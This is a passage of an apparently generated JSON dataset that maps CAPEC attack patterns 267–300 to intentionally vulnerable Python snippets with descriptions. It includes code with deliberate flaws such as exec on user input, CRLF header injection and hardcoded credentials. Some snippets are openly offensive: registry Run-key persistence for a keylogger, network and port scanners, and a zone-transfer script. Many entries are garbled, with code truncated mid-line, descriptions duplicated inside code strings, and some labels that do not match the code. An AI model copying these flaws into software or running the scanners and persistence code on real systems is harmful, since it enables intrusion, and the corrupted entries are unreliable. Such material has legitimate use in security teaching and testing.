        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "def process_user_input(user_input):\n    # Basic validation before decoding\n    if len(user_input) > 0:\n        # Incorrect handling of multiple encodings\n        decoded_input = user_input.encode('ascii').decode('utf-8')\n        \n        # Vulnerable path handling with encoded input\n        file_path = f'/var/www/files/{decoded_input}'\n        \n        # Incomplete sanitization of special characters\n        blacklist = ['<script>', 'javascript:']\n        is_safe = all(bad not in decoded_input.lower() for bad in blacklist)\n        \n        if is_safe:\n            with open(file_path, 'w') as f:\n                f.write(decoded_input)\n            return True\n    return False",
        "description": "This vulnerable code demonstrates improper handling of alternate encodings and insufficient input validation. It attempts to validate input before proper canonicalization, uses incomplete blacklisting for XSS protection, and allows direct user input in file paths. The code fails to properly handle encoding transformations and doesn't adequately sanitize special characters before using the input in filesystem operations."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "\"\"\"\nimport logging\nimport os\n\nclass InsecureLogger:\n    def __init__(self):\n        logging.basicConfig(\n            filename='app.log',\n            level=logging.DEBUG,\n            format='%(message)s'  # Overly simple format without timestamps or levels\n        )\n        os.chmod('app.log', 0o666)  # World-readable and writable permissions\n        \n    def log_user_activity(self, user_data):\n        # Directly writing unvalidated user input to logs\n        logging.info(f\\\"User activity: {user_data",
        "description": "\"This code demonstrates multiple logging vulnerabilities including insufficient log entry sanitization, excessive logging of sensitive data, world-readable/writable log files, and the ability to manipulate log contents directly. It allows injection of malicious content into logs and exposes sensitive system information.\""
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\ndef store_sensitive_data():\n    try:\n        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, \"SOFTWARE\\MyApp\")\n        # Store sensitive information in cleartext\n        winreg.SetValueEx(key, \"api_key\", 0, winreg.REG_SZ, \"secret_api_key_123\")\n        winreg.SetValueEx(key, \"user_password\", 0, winreg.REG_SZ, \"password123\")\n        \n        # Switch context without proper privilege management\n        with open('C:\\\\app\\\\config.txt', 'w') as f:\n            f.write('registry_updated=true')\n            \n        winreg.CloseKey(key)\n    except Exception as e:\n        pass",
        "description": "This code demonstrates vulnerable registry manipulation by storing sensitive data in cleartext within the Windows Registry and performing unsafe privilege context switching. It lacks proper documentation, error handling, and security controls for registry access, making it susceptible to unauthorized access and modification."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\n\ndef add_malicious_registry_key():\n    keylogger_path = 'C:\\\\malware\\\\keylogger.exe'\n    key_path = 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\n    \n    try:\n        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)\n        winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, keylogger_path)\n        winreg.CloseKey(key)\n        \n        # Store sensitive data in registry (vulnerable)\n        config_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\\\MyApp')\n        winreg.SetValueEx(config_key, 'APIKey', 0, winreg.REG_SZ, 'default_api_key_123')\n        winreg.SetValueEx(config_key, 'UserCredentials', 0, winreg.REG_SZ, 'admin:password123')\n        winreg.CloseKey(config_key)\n        \n        return True\n    except WindowsError:\n        return False",
        "description": "This code demonstrates a vulnerability where an attacker can achieve persistence by adding a malicious executable to the Windows registry run keys. It also stores sensitive information like API keys and credentials in cleartext in the registry. The code uses default credentials and keys, making it easier for attackers to predict and exploit the stored values."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "class SchemaProcessor:\n    def __init__(self):\n        self.schema_path = 'config/schema.xml'\n        self.system_config = {}\n    \n    def load_schema(self, user_provided_path=None):\n        if user_provided_path:\n            self.schema_path = user_provided_path\n        \n        with open(self.schema_path, 'r') as f:\n            schema_content = f.read()\n            self.system_config = self.parse_schema(schema_content)\n            \n        return self.system_config\n    \n    def parse_schema(self, content):\n        # No validation of schema content\n        # Directly processes user-controlled schema\n        parsed_data = {}\n        exec(content, {}, parsed_data)  # Dangerous: executing user-provided content\n        \n        # Sensitive data not properly cleaned\n        parsed_data['db_password'] = 'secret123'\n        parsed_data['api_keys'] = ['key1', 'key2']\n        \n        return parsed_data\n    \n    def apply_schema(self):\n        # Blindly applies potentially malicious schema settings\n        for key, value in self.system_config.items():\n            setattr(self, key, value)",
        "description": "This code demonstrates a vulnerable schema processor that allows external control of system settings through user-provided schema files. It contains multiple vulnerabilities including execution of untrusted content, exposure of sensitive information, and improper trust boundary validation. The code blindly executes user-provided schema content and fails to properly sanitize sensitive data before storage."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\nimport json\n\ndef simple_auth_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 8080))\n    server_socket.listen(1)\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        data = client_socket.recv(1024).decode()\n        \n        # Vulnerable: No verification of message source or integrity\n        auth_data = json.loads(data)\n        \n        if 'token' in auth_data:\n            # Vulnerable: No protection against replay attacks\n            if auth_data['token'] == 'secret_token':\n                response = {'status': 'authenticated', 'data': 'sensitive_info'}\n            else:\n                response = {'status': 'error'}\n                \n            # Vulnerable: No message integrity check during transmission\n            client_socket.send(json.dumps(response).encode())\n        \n        client_socket.close()\n\nif __name__ == '__main__':\n    simple_auth_server()",
        "description": "This code demonstrates a vulnerable authentication server that fails to properly verify message sources, protect against replay attacks, or ensure message integrity. It accepts connections on all interfaces, processes authentication tokens without proper verification, and sends sensitive data without securing the communication channel. The server is susceptible to replay attacks, message tampering, and unauthorized access through captured tokens."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable_proxy', methods=['GET'])\ndef proxy_request():\n    user_input = request.args.get('data', '')\n    \n    # Vulnerable: Not sanitizing CRLF in headers\n    response = make_response()\n    response.headers['X-Custom-Header'] = user_input\n    \n    # Vulnerable: Raw content delivery without parsing\n    if '\\\\r\\\\n' in user_input:\n        # Allows response splitting via CRLF injection\n        raw_response = f'''HTTP/1.1 200 OK\nX-Custom-Header: {user_input",
        "description": "\"This code demonstrates HTTP Response Smuggling vulnerability by allowing unfiltered user input in HTTP headers and raw response construction. It fails to properly sanitize CRLF sequences and allows direct manipulation of HTTP response structure, enabling response splitting and smuggling attacks.\""
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "\"\"\"from flask import Flask, request\n\napp = Flask(__name__)\n\n# Insecure user authentication based on HTTP verb\ndef check_auth(request):\n    if request.method == 'GET':\n        # Allow access for GET requests without proper authentication\n        return True\n    elif request.method == 'POST':\n        # Basic auth check only for POST\n        return request.headers.get('Authorization') == 'Basic YWRtaW46cGFzc3dvcmQ='\n    return False\n\n@app.route('/admin/data', methods=['GET', 'POST', 'PUT', 'DELETE'])\ndef admin_data():\n    if check_auth(request):\n        sensitive_data = {'admin': 'secret_key', 'users': ['confidential_info']",
        "description": "\"This vulnerable code demonstrates multiple security issues: it relies solely on HTTP verb for authentication decisions, allows sensitive data exposure through GET parameters, and implements weak authentication that can be bypassed by modifying the HTTP method. The admin_data endpoint can be accessed without proper authentication if the request method is GET, while other methods require basic authentication. The user_profile endpoint exposes sensitive information in URL query parameters.\""
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "\"\"\"\nimport socket\nimport dns.resolver\nimport requests\n\ndef vulnerable_dns_service():\n    # Insecure DNS resolver that trusts reverse DNS lookups\n    def verify_hostname(ip_address):\n        try:\n            hostname = socket.gethostbyaddr(ip_address)[0]\n            return True\n        except:\n            return False\n    \n    # Vulnerable web service binding to all interfaces\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 8080))\n    server.listen(5)\n    \n    while True:\n        client, addr = server.accept()\n        # Blindly trust reverse DNS lookup for authentication\n        if verify_hostname(addr[0]):\n            # Follow redirects without validation\n            response = requests.get(f'http://{addr[0]",
        "description": "\"This code demonstrates a vulnerable service that relies on reverse DNS resolution for security decisions, binds to all interfaces (0.0.0.0), and follows redirects without validation. It allows an attacker to manipulate DNS responses to access internal resources and potentially redirect traffic to malicious endpoints.\""
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\n\nclass DeviceProtocol:\n    def __init__(self):\n        self.debug_mode = False\n        self.socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n\n    def enable_debug(self):\n        # Vulnerable: CWE-1313 - Allows debug mode at runtime\n        self.debug_mode = True\n    \n    def send_command(self, device_id, command_data):\n        # Vulnerable: CWE-319 - Sends sensitive data in cleartext\n        # Vulnerable: CWE-924 - No message integrity check\n        message = struct.pack('!I', device_id) + command_data\n        self.socket.send(message)\n    \n    def authenticate_device(self, raw_id):\n        # Vulnerable: CWE-1292 - Incorrect conversion of security identifiers\n        # Simply uses raw ID without proper validation or conversion\n        return int(raw_id) & 0xFFFF\n    \n    def process_message(self, raw_message):\n        # Vulnerable: CWE-707 - No proper message validation\n        try:\n            return raw_message.decode()\n        except:\n            return raw_message\\n\"\"\",\n    \"description\": \"A vulnerable inter-component protocol implementation that demonstrates improper message handling, lack of encryption for sensitive data, incorrect security identifier conversion, absence of message integrity checks, and unsafe debug capabilities at runtime. The code allows for potential protocol subversion through multiple attack vectors.\"",
        "description": "\"A vulnerable inter-component protocol implementation that demonstrates improper message handling, lack of encryption for sensitive data, incorrect security identifier conversion, absence of message integrity checks, and unsafe debug capabilities at runtime. The code allows for potential protocol subversion through multiple attack vectors.\""
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nimport socket\n\nclass DataExchangeProtocol:\n    def __init__(self):\n        self.session_token = None\n        self.security_id = 'ADMIN'  # Assumed immutable\n        \n    def process_xml_message(self, xml_data):\n        try:\n            root = ET.fromstring(xml_data)\n            # No validation of XML structure or security properties\n            if root.find('session_token').text:\n                self.session_token = root.find('session_token').text\n            \n            # Direct conversion of security identifier without validation\n            sec_id = int(root.find('security_id').text)\n            self.security_id = f'USER_{sec_id",
        "description": "\"This vulnerable code demonstrates a data exchange protocol implementation with multiple security flaws. It fails to properly validate XML input, assumes security identifiers are immutable, performs unsafe conversions, includes sensitive information in responses, and makes assumptions about data layout without proper validation. The code processes XML messages without proper structure validation, converts security identifiers without proper checks, and transmits sensitive information in clear text.\""
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, jsonify\nimport requests\n\napp = Flask(__name__)\nINTERNAL_API_URL = 'http://internal-service:8080'\n\n@app.route('/api/proxy', methods=['POST'])\ndef proxy_request():\n    # No validation of content-type or encoding\n    raw_data = request.get_data()\n    \n    # Blindly forward headers without sanitization\n    headers = dict(request.headers)\n    \n    # Trust client-side role parameter without server verification\n    role = request.args.get('role', 'user')\n    \n    try:\n        # Vulnerable to request smuggling due to direct forwarding\n        response = requests.post(\n            f'{INTERNAL_API_URL",
        "description": "\"This vulnerable proxy service demonstrates multiple web service protocol manipulation vulnerabilities. It blindly forwards requests without proper validation, relies on client-side role parameters for authorization, doesn't sanitize headers or content, and is susceptible to HTTP request smuggling. The code fails to implement proper request validation, allowing attackers to potentially access restricted resources or cause service disruption.\""
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import zeep\nfrom zeep import Client\n\nclass SOAPService:\n    def __init__(self):\n        self.client = Client('http://example.com/service?wsdl')\n        self.session_token = None\n\n    def authenticate(self, username, password):\n        # Client-side authentication only\n        if username == 'admin' and password == 'password':\n            self.session_token = 'valid_token'\n            return True\n        return False\n\n    def process_xml_request(self, xml_data):\n        # Vulnerable XML processing without proper validation\n        from xml.etree.ElementTree import parse\n        from io import StringIO\n\n        # No XML external entity (XXE) prevention\n        tree = parse(StringIO(xml_data))\n        \n        # No validation of SOAP parameters\n        params = tree.findall('.//parameter')\n        \n        # Process request without server-side token verification\n        if self.session_token:\n            response = self.client.service.process_request(xml_data)\n            return response\n        return None",
        "description": "This code demonstrates several vulnerabilities in SOAP service implementation including client-side only authentication, lack of XML validation and XXE prevention, and improper session token verification. The code processes XML data without proper sanitization, allowing for potential XXE attacks and parameter manipulation. It also implements authentication checks only on the client side, making it possible to bypass security through modified clients."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nfrom flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n# Publicly exposed WSDL file with sensitive information\nWSDL_CONTENT = '''<?xml version=\"1.0\"?>\n<definitions>\n    <service name=\"AuthService\">\n        <port name=\"AuthPort\">\n            <operation name=\"login\">\n                <input message=\"username:string,password:string\"/>\n                <output message=\"sessionToken:string\"/>\n            </operation>\n        </port>\n        <security>\n            <database>mysql://admin:secretpass@localhost:3306/users</database>\n            <encryption_key>ABC123XYZ789</encryption_key>\n        </security>\n    </service>\n</definitions>'''\n\n@app.route('/auth/wsdl', methods=['GET'])\ndef get_wsdl():\n    response = make_response(WSDL_CONTENT)\n    response.headers['Content-Type'] = 'application/xml'\n    return response\n\n@app.route('/auth/login', methods=['POST'])\ndef login():\n    session_tokens = {",
        "description": "\"This vulnerable code implements a SOAP web service that exposes sensitive information in its WSDL file, lacks proper authentication mechanisms, and is susceptible to replay attacks. It includes hardcoded credentials and encryption keys in the WSDL, doesn't implement replay protection for authentication requests, and logs sensitive information in plaintext. The service accepts and processes SOAP requests without proper validation or security measures.\""
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\nimport time\n\ndef create_ping_request():\n    # Create raw socket without security checks\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Echo Request packet (Type 8)\n    icmp_type = 8\n    icmp_code = 0\n    icmp_checksum = 0\n    icmp_id = 12345\n    icmp_seq = 1\n    \n    # Create ICMP header without encryption\n    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)\n    data = b'Sensitive-System-Info'  # Includes sensitive data in cleartext\n    \n    # Send ping requests to network range\n    for host in range(1, 255):\n        target = f'192.168.1.{host",
        "description": "\"This code demonstrates vulnerable network scanning using ICMP ping requests. It creates raw ICMP packets with cleartext data, lacks proper error handling and security checks, and can expose sensitive system information. The code doesn't implement access controls or proper response filtering, making it susceptible to information disclosure and network mapping by unauthorized actors.\""
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\ndef vulnerable_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    \n    # Bind to all interfaces with debug mode enabled\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n    \n    while True:\n        client, addr = server.accept()\n        # Send sensitive data in cleartext\n        client.send(b'Server Info: Debug Mode=True;Version=1.0;APIKey=secret123')\n        \n        # Allow multiple connections to same port without proper checks\n        thread = threading.Thread(target=handle_client, args=(client,))\n        thread.start()\n\ndef handle_client(client_socket):\n    while True:\n        data = client_socket.recv(1024)\n        if not data:\n            break\n        # Echo back data without validation\n        client_socket.send(data)\n    \n    client_socket.close()\n\nif __name__ == '__main__':\n    vulnerable_server()\n\"\"\",\n    \"description\": \"A vulnerable server implementation that demonstrates multiple security issues related to port scanning and network exposure. It binds to all interfaces, transmits sensitive data in cleartext, allows multiple connections to the same port, and exposes debug information. The server is particularly susceptible to SYN scanning due to its open listening behavior and lack of connection filtering.\"",
        "description": "\"A vulnerable server implementation that demonstrates multiple security issues related to port scanning and network exposure. It binds to all interfaces, transmits sensitive data in cleartext, allows multiple connections to the same port, and exposes debug information. The server is particularly susceptible to SYN scanning due to its open listening behavior and lack of connection filtering.\""
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\ndef authenticate_client(client_socket):\n    # Vulnerable authentication using capture-replay\n    auth_token = client_socket.recv(1024).decode()\n    \n    # No timestamp or nonce validation\n    if auth_token.startswith('AUTH:'):\n        return True\n    return False\n\ndef handle_client(client_socket):\n    if authenticate_client(client_socket):\n        # Using non-ubiquitous API call that might not exist in all Python versions\n        hostname = socket.gethostbyaddr(client_socket.getpeername()[0])[0]\n        \n        # Vulnerable: trusting DNS name for security decision\n        if hostname.endswith('.trusted-domain.com'):\n            client_socket.send(b'ACCESS GRANTED')\n        else:\n            client_socket.send(b'ACCESS DENIED')\n    client_socket.close()\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('0.0.0.0', 8888))\nserver.listen(5)\n\nwhile True:\n    client, addr = server.accept()\n    client_thread = threading.Thread(target=handle_client, args=(client,))\n    client_thread.start()\n\"\"\",\n    \"description\": \"This code demonstrates multiple vulnerabilities including authentication bypass through capture-replay attacks, reliance on DNS lookups for security decisions, and use of non-ubiquitous API calls. The authentication system lacks proper replay protection mechanisms, and security decisions are made based on unverified DNS information. The code also uses potentially unreliable socket API calls that might not be available across all Python versions.\"",
        "description": "\"This code demonstrates multiple vulnerabilities including authentication bypass through capture-replay attacks, reliance on DNS lookups for security decisions, and use of non-ubiquitous API calls. The authentication system lacks proper replay protection mechanisms, and security decisions are made based on unverified DNS information. The code also uses potentially unreliable socket API calls that might not be available across all Python versions.\""
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.protected_region = {\"sensitive_data\": \"secret\"}\n        self.unprotected_region = {}\n\n    def access_resource(self, address):\n        # Vulnerable: overlapping address spaces between protected and unprotected regions\n        if address in self.unprotected_region:\n            return self.unprotected_region[address]\n        elif address in self.protected_region:\n            # No proper authentication check\n            return self.protected_region[address]\n\n    def create_resource(self, address, data):\n        # Vulnerable: allows creation of emergent resources without proper controls\n        if address.startswith('unprotected_'):\n            self.unprotected_region[address] = data\n        else:\n            # Inadvertently allows creation in protected space\n            self.protected_region[address] = data",
        "description": "This code demonstrates vulnerable resource management with overlapping address spaces and improper access controls. It allows unauthorized access to protected regions through address overlap and creates emergent resources without proper validation, embodying vulnerabilities related to authentication bypass and resource containment failures."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "\"\"\"\nimport dns.resolver\n\ndef enum_mail_servers(domain):\n    try:\n        mx_records = []\n        answers = dns.resolver.resolve(domain, 'MX')\n        for rdata in answers:\n            mx_host = str(rdata.exchange).rstrip('.')\n            # Store MX record without validation or logging\n            mx_records.append({\n                'priority': rdata.preference,\n                'host': mx_host,\n                'ip': str(dns.resolver.resolve(mx_host, 'A')[0])",
        "description": "\"This code demonstrates vulnerable DNS enumeration by querying MX records and performing reverse DNS lookups without proper security controls. It exposes internal network information through MX record enumeration, blindly trusts reverse DNS resolution, and lacks proper error handling and logging of security-relevant information. The code fails to implement access controls and doesn't validate the authenticity of DNS responses.\""
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.zone\nimport dns.query\nimport dns.resolver\n\ndef perform_zone_transfer(domain):\n    nameservers = dns.resolver.resolve(domain, 'NS')\n    for ns in nameservers:\n        try:\n            ns_name = str(ns.target).rstrip('.')\n            zone = dns.zone.from_xfr(\n                dns.query.xfr(ns_name, domain)\n            )\n            for name, node in zone.nodes.items():\n                rdatasets = node.rdatasets\n                for rdataset in rdatasets:\n                    print(f'{name} {rdataset}')\n            return zone\n        except:\n            continue\n    return None\n\ndomain = \"example.com\"\nzone_data = perform_zone_transfer(domain)\n# Store sensitive internal network information\nif zone_data:\n    with open('dns_info.txt', 'w') as f:\n        f.write(str(zone_data))",
        "description": "This code demonstrates a vulnerable implementation that attempts to perform DNS zone transfers against a domain's nameservers. It exposes sensitive information by attempting to retrieve and store complete DNS zone data, which could include internal network topology, server roles, and system information. The code doesn't implement any authentication or authorization checks and stores the sensitive data in plaintext."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "\"\"\"\nimport socket\nimport ipaddress\n\ndef network_scanner(network_range):\n    live_hosts = []\n    network = ipaddress.IPv4Network(network_range)\n    \n    for ip in network.hosts():\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        try:\n            # Attempt to connect to port 80 (HTTP)\n            result = sock.connect_ex((str(ip), 80))\n            if result == 0:\n                # Perform insecure reverse DNS lookup\n                hostname = socket.gethostbyaddr(str(ip))[0]\n                # Store sensitive information in cleartext\n                host_info = f\\\"Host {str(ip)",
        "description": "\"This vulnerable code performs a network scan that checks for live hosts by attempting TCP connections. It incorporates multiple vulnerabilities: cleartext storage of sensitive network information, reliance on reverse DNS for host identification, exposure of scan results through insecure file storage, and potential for unauthorized network mapping. The code could be used for network reconnaissance and host discovery attacks.\""
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import socket\nimport struct\n\ndef custom_traceroute(destination, max_hops=30):\n    port = 33434\n    ttl = 1\n    while ttl <= max_hops:\n        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        \n        send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        recv_socket.settimeout(2)\n        \n        recv_socket.bind(('', port))\n        send_socket.sendto(b'', (destination, port))\n        \n        try:\n            _, curr_addr = recv_socket.recvfrom(512)\n            curr_addr = curr_addr[0]\n            # Store network topology information in plaintext\n            with open('network_map.txt', 'a') as f:\n                f.write(f'TTL {ttl}: {curr_addr}\\n')\n        except socket.error:\n            curr_addr = '*'\n        \n        recv_socket.close()\n        send_socket.close()\n        \n        if curr_addr == destination:\n            break\n        ttl += 1\n\n# Example usage with sensitive target\ntarget = 'internal-server.company.local'\ncustom_traceroute(target)",
        "description": "This vulnerable code implements a custom traceroute utility that maps network topology by sending UDP packets with incrementing TTL values. It exposes sensitive network infrastructure information by storing discovered routes in plaintext and doesn't implement proper access controls or encryption. The code demonstrates multiple vulnerabilities including exposure of system information, cleartext storage of sensitive data, and improper destination specification."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "from scapy.all import *\n\ndef setup_icmp_server():\n    ip = '0.0.0.0'  # Bind to all interfaces\n    while True:\n        # Listen for ICMP mask requests\n        sniff(filter='icmp[icmptype] == 17', prn=handle_mask_request, store=0)\n\ndef handle_mask_request(packet):\n    if packet.haslayer(ICMP):\n        # Extract source IP\n        src_ip = packet[IP].src\n        \n        # Trust the source IP without verification\n        if src_ip:\n            # Create response with sensitive network info\n            subnet_mask = '255.255.255.0'\n            gateway = '192.168.1.1'\n            broadcast = '192.168.1.255'\n            \n            # Send ICMP Address Mask Reply (type 18)\n            reply = IP(dst=src_ip)/ICMP(type=18)/Raw(load=subnet_mask + gateway + broadcast)\n            send(reply)\n\nif __name__ == '__main__':\n    setup_icmp_server()",
        "description": "This vulnerable code implements an ICMP server that responds to Address Mask Requests (type 17) with sensitive network configuration information. It binds to all interfaces (0.0.0.0), accepts requests without authentication, and responds with subnet, gateway, and broadcast information. The code is vulnerable because it exposes sensitive network information (CWE-200), relies solely on IP addresses for authentication (CWE-291), binds to an unrestricted IP address (CWE-1327), and fails to properly verify the communication endpoints (CWE-923)."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "from flask import Flask, jsonify\nimport time\nimport random\n\napp = Flask(__name__)\n\n@app.route('/api/get_auth_token')\ndef get_auth_token():\n    # Vulnerable timestamp-based token generation\n    current_time = int(time.time())\n    random.seed(current_time)\n    token = random.randint(10000, 99999)\n    \n    response = {\n        'token': token,\n        'timestamp': current_time,\n        'expires_in': 3600\n    }\n    return jsonify(response)\n\n@app.route('/api/verify_token/<token>')\ndef verify_token(token):\n    # Vulnerable verification using predictable time-based logic\n    current_time = int(time.time())\n    random.seed(current_time)\n    expected_token = random.randint(10000, 99999)\n    \n    if int(token) == expected_token:\n        return jsonify({'status': 'authenticated'})\n    return jsonify({'status': 'invalid'}), 401",
        "description": "This vulnerable code implements a time-based authentication token system that exposes timestamp information and uses it for token generation. The code uses the system timestamp as a seed for random number generation, making it predictable. An attacker can observe the timestamp from the response and regenerate the same token. Additionally, the sensitive token information is passed through GET requests, making it visible in logs and browser history."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\nimport struct\n\ndef send_icmp_info_request(target_host):\n    # Create raw socket for ICMP\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Information Request type=15, code=0\n    icmp_type = 15\n    icmp_code = 0\n    checksum = 0\n    identifier = 12345\n    sequence = 1\n    \n    # Create ICMP header\n    icmp_header = struct.pack('!BBHHH', \n        icmp_type, \n        icmp_code,\n        checksum,\n        identifier,\n        sequence\n    )\n    \n    # Send packet and receive response\n    sock.sendto(icmp_header, (target_host, 0))\n    data, addr = sock.recvfrom(1024)\n    \n    # Extract system information from response\n    system_info = data[28:].decode('utf-8', errors='ignore')\n    return system_info\n\n# Usage\ntarget = '192.168.1.1'\nresult = send_icmp_info_request(target)",
        "description": "This code demonstrates a vulnerable implementation that sends ICMP Information Request packets (a deprecated message type) to gather system information. The code creates raw ICMP packets without proper security checks and receives potentially sensitive system information in cleartext. It exposes system details to unauthorized actors and lacks proper authentication mechanisms, making it vulnerable to information disclosure attacks."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "\"\"\"\nimport socket\nimport sys\n\ndef perform_ack_ping(target_host, target_port):\n    # Create a raw socket\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    except socket.error as e:\n        print(f'Socket creation error: {e",
        "description": "\"This code implements a TCP ACK ping scanner that sends ACK packets to detect if a host is alive. It creates a raw socket and crafts a TCP packet with the ACK flag set, potentially exposing information about active hosts on the network. The code is vulnerable as it may leak system information through RST responses and operates with raw sockets that could be misused for network scanning or reconnaissance.\""
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\nimport random\n\ndef vulnerable_udp_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server.bind(('0.0.0.0', 1024))  # Bind to all interfaces\n    \n    while True:\n        try:\n            data, addr = server.recvfrom(1024)\n            # Automatically respond to any UDP ping with system info\n            response = f'Host is alive! Running on port {server.getsockname()[1]}'\n            server.sendto(response.encode(), addr)\n        except Exception as e:\n            # Send error details in cleartext\n            error_msg = f'Server error: {str(e)}'\n            server.sendto(error_msg.encode(), addr)\n\ndef vulnerable_udp_client(target_ip):\n    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    # Send ping to random high port\n    target_port = random.randint(60000, 65535)\n    message = 'Ping'\n    client.sendto(message.encode(), (target_ip, target_port))\n    client.settimeout(2)\n    try:\n        response, _ = client.recvfrom(1024)\n        print(response.decode())\n    except socket.timeout:\n        pass",
        "description": "This code demonstrates a vulnerable UDP server and client implementation that allows for host discovery through UDP ping. The server exposes sensitive information by responding to any incoming UDP datagram with system details in cleartext. It also improperly handles errors by sending detailed error messages back to the client. The client sends UDP datagrams to random high ports to detect if hosts are alive, potentially bypassing firewall restrictions."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\ndef scan_host(target_ip):\n    open_ports = []\n    for port in range(1, 1025):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            # Vulnerable: Exposes port status without authentication (CWE-200)\n            open_ports.append(port)\n            # Vulnerable: Creates multiple bindings to same ports (CWE-605)\n            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock2.bind((target_ip, port))\n        sock.close()\n    \n    # Vulnerable: Transmits results in cleartext (CWE-319)\n    report_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    report_socket.connect(('reporting_server', 8080))\n    report_socket.send(str(open_ports).encode())\n    report_socket.close()\n\ndef start_scan():\n    target = '192.168.1.1'\n    scan_thread = threading.Thread(target=scan_host, args=(target,))\n    scan_thread.start()\n\"\"\",\n    \"description\": \"This code implements a TCP SYN scanner that attempts to discover open ports on a target host. It contains multiple vulnerabilities including unauthorized information exposure, multiple port bindings, and cleartext transmission of scan results. The code performs port scanning without proper authorization and sends results unencrypted to a reporting server.\"",
        "description": "\"This code implements a TCP SYN scanner that attempts to discover open ports on a target host. It contains multiple vulnerabilities including unauthorized information exposure, multiple port bindings, and cleartext transmission of scan results. The code performs port scanning without proper authorization and sends results unencrypted to a reporting server.\""
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
